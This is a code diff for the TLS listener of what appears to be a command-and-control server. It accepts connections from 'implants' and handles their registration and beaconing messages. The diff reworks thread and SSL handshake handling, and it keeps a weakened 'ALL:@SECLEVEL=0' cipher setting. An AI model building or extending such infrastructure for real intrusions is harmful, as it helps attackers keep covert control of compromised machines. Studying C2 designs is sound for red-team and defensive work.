@@ -29,8 +29,9 @@
 #include "agent.h"
 
 struct tcp_ssl_thread_args {
-    SSL *ssl;
-    char ip[256];
+    SSL_CTX *ctx;
+    int client_fd;
+    char ip[INET_ADDRSTRLEN];
 };
 
 
@@ -97,46 +98,78 @@ void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
 
 void *tcp_ssl_agent_handler(void *args) {
     struct tcp_ssl_thread_args *arg = (struct tcp_ssl_thread_args*)args;
-    SSL *ssl  = arg->ssl;
+    SSL_CTX *ctx  = arg->ctx;
+    int client_fd = arg->client_fd;
 
+    SSL *ssl = SSL_new(ctx);
+    if (!ssl) {
+        fprintf(stderr, "[!] SSL_new failed\n");
+        close(client_fd);
+        free(arg);
+        return NULL;
+    }
 
-    // recieves message from implant register or beaconing
+    if (SSL_set_fd(ssl, client_fd) != 1) {
+        fprintf(stderr, "[!] SSL_set_fd failed\n");
+        SSL_free(ssl);
+        close(client_fd);
+        free(arg);
+        return NULL;
+    }
+
+    if (SSL_accept(ssl) != 1) {
+        fprintf(stderr, "[!] SSL_accept failed\n");
+        ERR_print_errors_fp(stderr);
+        SSL_free(ssl);
+        close(client_fd);
+        free(arg);
+        return NULL;
+    }
+
     char buffer[BUFFER_SIZE];
-    //int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
-    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
+    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
     if (bytes_received <= 0) {
-        log_message(LOG_ERROR, "Recv failed");
+        fprintf(stderr, "[!] SSL_read failed\n");
+        ERR_print_errors_fp(stderr);
+        SSL_shutdown(ssl);
+        SSL_free(ssl);
+        close(client_fd);
+        free(arg);
         return NULL;
     }
     buffer[bytes_received] = '\0';
 
     cJSON *json = cJSON_Parse(buffer);
     if (!json) {
-        //printf("Error parsing JSON!\n");
-        log_message(LOG_ERROR, "Error parsing JSON [Implant Handler]");
+        fprintf(stderr, "[!] Error parsing JSON\n");
+        SSL_shutdown(ssl);
+        SSL_free(ssl);
+        close(client_fd);
+        free(arg);
         return NULL;
     }
 
     cJSON *type = cJSON_GetObjectItem(json, "mode");
-    if (strcmp(type->valuestring, "register") == 0) {
+    if (!type) {
+        fprintf(stderr, "[!] No mode in JSON\n");
+    } else if (strcmp(type->valuestring, "register") == 0) {
         ssl_register_agent(json, arg->ip, ssl);
     } else if (strcmp(type->valuestring, "beacon") == 0) {
         ssl_beacon(json, ssl);
     } else if (strcmp(type->valuestring, "session") == 0) {
-        // session mode
-        // session();
+        // session handling here
     }
 
-    //cJSON_Delete(json);
+    cJSON_Delete(json);
+    SSL_shutdown(ssl);
     SSL_free(ssl);
-    free(args);
+    close(client_fd);
+    free(arg);
     return NULL;
 }
 
-
+// Listener: accepts TCP connections and spawns SSL threads
 void* tcp_ssl_listener(void *args) {
-    init();
-
     struct Args_t {
         char cert[BUFFER_SIZE];
         char key[BUFFER_SIZE];
@@ -144,107 +177,67 @@ void* tcp_ssl_listener(void *args) {
     };
 
     struct Args_t *Args = (struct Args_t*)args;
-
-    char cert[BUFFER_SIZE];
-    char key[BUFFER_SIZE];
+    char cert[BUFFER_SIZE], key[BUFFER_SIZE];
     int PORT = Args->port;
-
     strncpy(cert, Args->cert, BUFFER_SIZE);
     strncpy(key, Args->key, BUFFER_SIZE);
-
-        // generate certificates if they dont exesits
-    if (access(cert, F_OK) != 0 || access(key, F_OK) != 0) {
-        generate_key_and_cert(cert, key);
-    }
     free(args);
-    
-    int serverSock, agentSock;
 
-    struct sockaddr_in client_addr;
-    socklen_t len = sizeof(client_addr);
+    // create TCP socket
+    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (serverSock < 0) { perror("Socket creation failed"); return NULL; }
 
-    struct sockaddr_in addr;
+    struct sockaddr_in addr = {0};
+    addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons(PORT);
-    addr.sin_family = AF_INET;
 
-
-    if ((serverSock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
-        perror("Socket creation failed");
-        // log
-        sleep(60);
-        return NULL;
+    if (bind(serverSock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        perror("Bind failed"); close(serverSock); return NULL;
     }
 
-    if (bind(serverSock, (struct sockaddr*)&addr, sizeof(addr))) {
-        perror("binding failed");
-        close(serverSock);
-        return NULL;
+    if (listen(serverSock, SOMAXCONN) < 0) {
+        perror("Listen failed"); close(serverSock); return NULL;
     }
 
-    if (listen(serverSock, SOMAXCONN) == -1) {
-        perror("Listen Failed");
-        close(serverSock);
-        sleep(60);
-        return NULL;
-    }
-
-    // openssl to socket
+    // SSL context
     const SSL_METHOD *method = TLS_server_method();
-	SSL_CTX *ctx = SSL_CTX_new(method);
-    if (!ctx) {
-        perror("Unable to create SSL context");
-        sleep(60);
+    SSL_CTX *ctx = SSL_CTX_new(method);
+    if (!ctx) { perror("SSL_CTX_new failed"); return NULL; }
+    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0"); // debugging only
+
+    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ||
+        SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0) {
+        ERR_print_errors_fp(stderr);
+        SSL_CTX_free(ctx);
         return NULL;
     }
-    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0");  // Allows all ciphers for debugging
-       // load certificates and key
-       SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM);
-       SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM);
-   
-   
-
 
     while (1) {
-        agentSock = accept(serverSock, (struct sockaddr*)&client_addr, &len);
-        if (agentSock == -1) {
-            perror("Accept Failed");
-            // log
-            continue;
-        }
-        SSL *ssl = SSL_new(ctx);
-        SSL_set_fd(ssl, agentSock);
-        // perform tls handshake
-        if (SSL_accept(ssl) <= 0) {
-            perror("TLS handshake Failed");
-            ERR_print_errors_fp(stderr);
-            SSL_free(ssl);
-            close(agentSock);
-            continue;
-        }
+        struct sockaddr_in client_addr;
+        socklen_t len = sizeof(client_addr);
+        int agentSock = accept(serverSock, (struct sockaddr*)&client_addr, &len);
+        if (agentSock < 0) { perror("Accept failed"); continue; }
 
-        // create thread to call tcp_enc_agent_handler and pass the following as arguments
-        // sock, ssl, ip (create heap chunk)
-        pthread_t thread;
-        struct tcp_ssl_thread_args *args = malloc(sizeof(struct tcp_ssl_thread_args));
-        args->ssl = ssl;
+        struct tcp_ssl_thread_args *args = malloc(sizeof(*args));
+        args->ctx = ctx;
+        args->client_fd = agentSock;
         strcpy(args->ip, inet_ntoa(client_addr.sin_addr));
-        
-        if (pthread_create(&thread, NULL, tcp_ssl_agent_handler, (void*)args) < 0) {
-            perror("could not create thread");
+
+        pthread_t thread;
+        if (pthread_create(&thread, NULL, tcp_ssl_agent_handler, args) < 0) {
+            perror("Thread creation failed");
+            close(agentSock);
             free(args);
             continue;
         }
-        // Detach thread so resources are automatically freed on exit
         pthread_detach(thread);
-
-
-        SSL_free(ssl);
-        close(agentSock);
     }
-    close(serverSock);
-}
 
+    close(serverSock);
+    SSL_CTX_free(ctx);
+    return NULL;
+}
 
 
 
